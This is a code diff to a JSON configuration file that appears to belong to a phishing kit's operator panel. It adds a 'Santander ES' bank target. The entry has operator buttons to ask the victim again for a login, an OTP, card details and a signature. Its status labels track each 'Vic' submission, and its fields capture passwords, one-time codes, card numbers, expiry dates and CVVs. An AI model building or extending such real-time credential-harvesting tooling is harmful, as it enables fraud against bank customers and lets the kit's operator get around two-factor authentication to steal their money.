@@ -153,6 +153,10 @@
       "id": "sants"
     },
     {
+      "name": "Santander ES",
+      "id": "santses"
+    },
+    {
       "name": "Suncorp",
       "id": "suncorp"
     },
@@ -4207,6 +4211,107 @@
     "mainInfo": [
       {
         "usernameHeading": "username"
+      }
+    ]
+  },
+  "santses": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "0"
+      },
+      {
+        "name": "ASK OTP",
+        "status": "2"
+      },
+      {
+        "name": "ASK CARD",
+        "status": "4"
+      },
+      {
+        "name": "ASK SIGNATURE",
+        "status": "6"
+      },
+      {
+        "name": "FINISH",
+        "status": "8"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Resubmitting Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting OTP"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted OTP"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting Card Info"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted Card Info"
+      },
+      {
+        "status": 6,
+        "meaning": "Vic Submitting Signature"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Waiting... Submitted Signature"
+      },
+      {
+        "status": 8,
+        "meaning": "Finished"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Document",
+        "key": "document"
+      },
+      {
+        "heading": "Document Number",
+        "key": "documentNumber"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "OTP",
+        "key": "otp"
+      },
+      {
+        "heading": "Card Number",
+        "key": "ccnum"
+      },
+      {
+        "heading": "Card Expiry",
+        "key": "ccexp"
+      },
+      {
+        "heading": "CVV",
+        "key": "cvv"
+      },
+      {
+        "heading": "Signature",
+        "key": "signature"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "documentNumber"
       }
     ]
   },
